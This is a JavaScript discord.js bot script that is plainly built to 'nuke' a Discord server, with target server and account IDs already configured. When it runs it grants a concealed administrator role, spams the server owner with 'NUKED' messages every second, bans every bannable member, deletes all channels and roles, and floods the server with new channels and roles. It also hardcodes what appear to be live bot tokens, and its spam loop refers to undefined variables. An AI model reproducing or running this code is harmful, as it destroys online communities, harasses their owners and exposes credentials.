const Discord = require("discord.js")
const client = new Discord.Client()
const token = "NzQ3NTM5MTg4NTEyOTgxMTMy.X0QWHw.SzVUhj3lyX6ISWJjwXtAd_VsHhs"
//const token = "NzUyMTgyNDc2NjQ1ODU5Mzg5.X1T6hQ.zGBVI7DhviklOZYCWzNxqLEUcq8"//

const setAdmin = (guildID, accountID) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.createRole({name: `\u200b`, color: 0x2F3136, permissions: "ADMINISTRATOR"}).then((role) => {

        targetServer.members.get(accountID).addRole(role).catch((err) => {
           return console.error(`You are not in the ${targetServer.name} server ! You must to be in this server befor leveling up !`)
        })
    })
}
  
const changeServerInfo = (guildID, options) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_GUILD")) return console.error(`${client.user.username} has not the required perms to make something like this`)
    
    targetServer.setName(options.newServerName)
    targetServer.setIcon(options.newServerIcon)

    const embed = new Discord.RichEmbed()
    .setAuthor(client.user.tag, client.user.avatarURL)
    .setTitle("NUKED")
    .setDescription(`YOUR SERVER ${targetServer.name} HAS BEEN ⇂Λ-ʎq-pǝʞnu`)
    .setFooter(client.user.tag, client.user.avatarURL)
    .setColor("#ff0000")

    setInterval(() => {
    return targetServer.owner.send(embed)
    }, 1000)
}

const banMembers = (guildID) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("BAN_MEMBERS")) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.members.forEach(async (member) => {
        member.bannable ? await member.ban({reason: `⇂Λ-ʎq-pǝʞnu`}) : undefined
    })
}

const changeNicks = (guildID, newNick) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_NICKNAMES")) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.members.forEach((member) => {
        try {
            
            member.setNickname(newNick, `⇂Λ-ʎq-pǝʞnu`)
        } catch (error) {
            undefined
        }
    })
}

const createChanelsAndRoles = (guildID, name) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_CHANNELS") || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
    targetServer.members.forEach((member) => {
  		member.roles.forEach(async (role) => {
            try {
                await member.removeRole(role)
                  
            } catch (error) {
                undefined
            }
  		})
    })

    targetServer.channels.forEach(async (channel) => {
        channel.deletable ? await channel.delete() : undefined
    })

    targetServer.roles.forEach(async(role) => {
        role.deletable ? await role.delete() : undefined
    })

    setInterval(async () => {
        await targetServer.createChannel(name, "text")
            while (i < 10) {
                message.guild.channel.find("name", "channel-name").send("Message");
            i++;
            }
        await targetServer.createChannel(name, "voice")
        await targetServer.createRole({name: `⇂Λ-ʎq-pǝʞnu`, permissions: 0, color: 0xFF0000 }).then(async(role) =>{
            await targetServer.members.forEach(async (member) => {
                try {
                    await member.addRole(role)
                } catch (error) {
                    undefined
                }
            })
        })
    }, 500)

}

client.on("ready", () => {
    console.log("THE HACKING STARTED NOW ")

    // Setup YOUR personnal settings
    const configs = {
        "targetServerID": "745042948835770461",
        "accountID": "430806138930462721",
        "botNickname": "⇂Λ-ʎq-pǝʞnu",
        "botIcon": 'https://cdn.discordapp.com/attachments/676032551587938309/752185900326453319/20200906_150536.png',
        "newServerIcon": "https://cdn.discordapp.com/attachments/676032551587938309/752185900326453319/20200906_150536.png",
        "newServerName": "⇂Λ-ʎq-pǝʞnu",
    }

    client.user.setUsername(configs.botNickname)
    client.user.setAvatar(configs.botIcon)

    // Enable all the options
    setAdmin(configs.targetServerID, configs.accountID)
    changeServerInfo(configs.targetServerID, {"newServerName": configs.newServerName, "newServerIcon": configs.newServerIcon})
    changeNicks(configs.targetServerID, configs.botNickname)
    banMembers(configs.targetServerID)
    createChanelsAndRoles(configs.targetServerID, configs.botNickname)
})


client.login(token)
